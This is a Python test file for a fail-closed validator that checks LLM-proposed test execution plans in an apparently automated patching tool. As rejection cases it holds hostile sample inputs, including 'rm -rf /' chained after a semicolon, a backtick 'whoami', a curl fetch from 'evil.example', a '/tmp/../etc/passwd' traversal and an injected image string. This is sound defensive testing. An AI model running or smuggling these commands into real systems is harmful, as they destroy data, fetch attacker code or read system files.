"""Tests for the deterministic, fail-closed TestExecutionPlan validation
boundary."""

from __future__ import annotations

from utilities.autopatcher.test_execution_models import TestExecutionPlan
from utilities.autopatcher.test_plan_validation import validate_plan


def _plan(**overrides) -> TestExecutionPlan:
    base = dict(
        setup_commands=(("python", "-m", "pip", "install", "-e", "."),),
        test_command=("python", "-m", "pytest", "--junitxml=/tmp/openant-result.xml"),
        result_strategy="junit",
        result_output_path="/tmp/openant-result.xml",
        runtime_family="python",
        runtime_version_hint="3.11",
        evidence=("pyproject.toml",),
        reasoning_summary="pyproject.toml declares pytest.",
        confidence="high",
        source="llm",
    )
    base.update(overrides)
    return TestExecutionPlan(**base)


class TestWellFormedPlansAccepted:
    def test_baseline_plan_is_valid(self):
        result = validate_plan(_plan())
        assert result.valid is True
        assert result.plan is not None
        assert result.reason is None

    def test_container_absolute_path_in_result_output_path_is_allowed(self):
        """This corrects the earlier over-broad rule -- container-internal
        absolute paths like /tmp/openant-result.xml must remain valid."""
        result = validate_plan(_plan(result_output_path="/tmp/openant-result.xml"))
        assert result.valid is True

    def test_repository_relative_paths_in_command_tokens_are_allowed(self):
        result = validate_plan(_plan(
            test_command=("python", "-m", "pytest", "tests/unit/test_x.py",
                          "--junitxml=/tmp/openant-result.xml"),
        ))
        assert result.valid is True

    def test_exit_code_strategy_with_no_output_path_is_valid(self):
        result = validate_plan(_plan(
            result_strategy="exit_code", result_output_path=None,
            test_command=("npm", "test"),
        ))
        assert result.valid is True

    def test_zero_setup_commands_is_valid(self):
        result = validate_plan(_plan(setup_commands=()))
        assert result.valid is True

    def test_make_based_plan_is_valid(self):
        """runtime_family describes the environment, not the tool --
        `make test` under a python runtime_family is a legitimate plan."""
        result = validate_plan(_plan(
            setup_commands=(("make", "setup"),), test_command=("make", "test"),
            result_strategy="exit_code", result_output_path=None,
        ))
        assert result.valid is True


class TestMalformedPlansRejected:
    def test_empty_test_command_rejected(self):
        result = validate_plan(_plan(test_command=()))
        assert result.valid is False
        assert "test_command" in result.reason

    def test_too_many_setup_commands_rejected(self):
        many = tuple(("python", "-c", f"pass{i}") for i in range(10))
        result = validate_plan(_plan(setup_commands=many))
        assert result.valid is False

    def test_too_many_tokens_in_a_command_rejected(self):
        result = validate_plan(_plan(test_command=("python",) + tuple(f"-x{i}" for i in range(20))))
        assert result.valid is False

    def test_shell_metacharacter_semicolon_rejected(self):
        result = validate_plan(_plan(test_command=("python", "-c", "pass; rm -rf /")))
        assert result.valid is False

    def test_shell_metacharacter_pipe_rejected(self):
        result = validate_plan(_plan(test_command=("python", "test.py", "|", "cat")))
        assert result.valid is False

    def test_backtick_rejected(self):
        result = validate_plan(_plan(test_command=("python", "-c", "`whoami`")))
        assert result.valid is False

    def test_unrecognized_binary_rejected(self):
        result = validate_plan(_plan(test_command=("curl", "http://evil.example/payload.sh")))
        assert result.valid is False
        assert "unrecognized binary" in result.reason

    def test_evidence_must_be_non_empty(self):
        result = validate_plan(_plan(evidence=()))
        assert result.valid is False
        assert "evidence" in result.reason

    def test_unrecognized_confidence_rejected(self):
        result = validate_plan(_plan(confidence="extremely-sure"))
        assert result.valid is False

    def test_unrecognized_result_strategy_rejected(self):
        result = validate_plan(_plan(result_strategy="xunit"))
        assert result.valid is False


class TestResultOutputPathBoundary:
    def test_junit_strategy_requires_output_path(self):
        result = validate_plan(_plan(result_strategy="junit", result_output_path=None))
        assert result.valid is False

    def test_output_path_outside_tmp_rejected(self):
        result = validate_plan(_plan(result_output_path="/repo/result.xml"))
        assert result.valid is False
        assert "/tmp/" in result.reason

    def test_output_path_with_traversal_rejected(self):
        result = validate_plan(_plan(result_output_path="/tmp/../etc/passwd"))
        assert result.valid is False

    def test_exit_code_strategy_forbids_output_path(self):
        result = validate_plan(_plan(result_strategy="exit_code", result_output_path="/tmp/x.xml"))
        assert result.valid is False


class TestJunitCommandConsistencyCheck:
    """validate_plan() rejects a "junit" plan whose test_command doesn't
    actually reference the declared result_output_path anywhere in its own
    tokens -- a simple substring consistency check, not a CLI parser for
    any specific runner's flag syntax (see test_plan_validation.py's
    module docstring and validate_plan's body)."""

    def test_junit_with_path_referenced_in_a_combined_flag_token_accepted(self):
        result = validate_plan(_plan(
            result_strategy="junit", result_output_path="/tmp/openant-result.xml",
            test_command=("python", "-m", "pytest", "--junitxml=/tmp/openant-result.xml"),
        ))
        assert result.valid is True

    def test_junit_with_path_referenced_across_two_tokens_accepted(self):
        """The check is a plain substring test over each token -- a
        flag/value pair split across two tokens (e.g. ``--junit-xml``
        followed by the path as its own argv token) is also accepted,
        since this is not a runner-specific CLI parser."""
        result = validate_plan(_plan(
            result_strategy="junit", result_output_path="/tmp/openant-result.xml",
            test_command=("go", "test", "-json", "/tmp/openant-result.xml"),
            runtime_family="go", evidence=("go.mod",),
        ))
        assert result.valid is True

    def test_junit_with_output_path_absent_from_command_rejected(self):
        result = validate_plan(_plan(
            result_strategy="junit", result_output_path="/tmp/openant-result.xml",
            test_command=("python", "-m", "pytest"),
        ))
        assert result.valid is False
        assert "does not reference" in result.reason

    def test_junit_with_mismatched_path_rejected(self):
        """The command references A junit path, but not THE declared
        result_output_path -- this must be rejected exactly like the
        path being absent altogether."""
        result = validate_plan(_plan(
            result_strategy="junit", result_output_path="/tmp/openant-result.xml",
            test_command=("python", "-m", "pytest", "--junitxml=/tmp/other-file.xml"),
        ))
        assert result.valid is False
        assert "does not reference" in result.reason

    def test_exit_code_with_null_result_path_accepted(self):
        result = validate_plan(_plan(
            result_strategy="exit_code", result_output_path=None,
            test_command=("make", "test"),
        ))
        assert result.valid is True


class TestRuntimeFamilyIsWellFormednessOnly:
    """validate_plan() only checks runtime_family is a RECOGNIZED value --
    whether it's actually SUPPORTED this release is test_executors.
    is_runtime_supported's separate concern (see test_test_executors.py)."""

    def test_none_runtime_family_is_valid(self):
        result = validate_plan(_plan(runtime_family=None))
        assert result.valid is True

    def test_rust_is_a_recognized_but_unshipped_family(self):
        # This test is only about runtime_family well-formedness -- use
        # exit_code so the unrelated junit/command consistency check
        # (tested separately below) doesn't interfere.
        result = validate_plan(_plan(
            runtime_family="rust", test_command=("cargo", "test"),
            result_strategy="exit_code", result_output_path=None,
        ))
        assert result.valid is True

    def test_arbitrary_string_masquerading_as_a_family_rejected(self):
        """An attempted image-string injection into runtime_family must be
        rejected -- there is no field anywhere in the schema for an
        actual Docker image string, and this field itself only accepts a
        closed set of recognized family names."""
        result = validate_plan(_plan(runtime_family="attacker/evil:latest"))
        assert result.valid is False
        assert "runtime_family" in result.reason


class TestVersionHintSanitizedNotRejecting:
    def test_malformed_version_hint_is_dropped_not_rejected(self):
        result = validate_plan(_plan(runtime_version_hint="3.11; rm -rf /"))
        assert result.valid is True
        assert result.plan.runtime_version_hint is None

    def test_well_formed_version_hint_preserved(self):
        result = validate_plan(_plan(runtime_version_hint="3.11"))
        assert result.valid is True
        assert result.plan.runtime_version_hint == "3.11"


class TestTapResultStrategy:
    """tap is a structured RESULT FORMAT, exactly like junit, but its
    result comes from captured stdout rather than a result_output_path
    file -- see test_plan_validation.py's module docstring and
    tap_parser.py."""

    def test_tap_with_null_output_path_is_valid(self):
        result = validate_plan(_plan(
            result_strategy="tap", result_output_path=None,
            test_command=("npm", "test"), runtime_family="node", evidence=("package.json",),
        ))
        assert result.valid is True

    def test_tap_with_an_output_path_set_is_rejected(self):
        """Unlike junit, tap has no report file to point at -- setting
        result_output_path for a "tap" plan is always a rejection, not a
        consistency check against test_command's tokens."""
        result = validate_plan(_plan(
            result_strategy="tap", result_output_path="/tmp/result.tap",
            test_command=("npm", "test"), runtime_family="node", evidence=("package.json",),
        ))
        assert result.valid is False
        assert "tap" in result.reason and "result_output_path" in result.reason

    def test_tap_does_not_require_test_command_to_reference_any_path(self):
        """The junit consistency check (test_command must reference
        result_output_path) does not apply to tap at all -- there is no
        path to reference in the first place."""
        result = validate_plan(_plan(
            result_strategy="tap", result_output_path=None,
            test_command=("node", "--test"), runtime_family="node", evidence=("package.json",),
        ))
        assert result.valid is True

    def test_tap_result_strategy_is_recognized_by_the_enum(self):
        from utilities.autopatcher.test_execution_models import VALID_RESULT_STRATEGIES
        assert "tap" in VALID_RESULT_STRATEGIES
        assert "junit" in VALID_RESULT_STRATEGIES
        assert "exit_code" in VALID_RESULT_STRATEGIES


class TestNeverRaises:
    def test_malformed_input_types_do_not_crash(self):
        broken = _plan()
        # Simulate a structurally-broken candidate slipping through by
        # constructing a plan with a non-tuple field via object.__new__
        # bypass is overkill; instead assert normal malformed content
        # (already covered above) never raises -- this test documents the
        # contract explicitly.
        result = validate_plan(broken)
        assert isinstance(result.valid, bool)
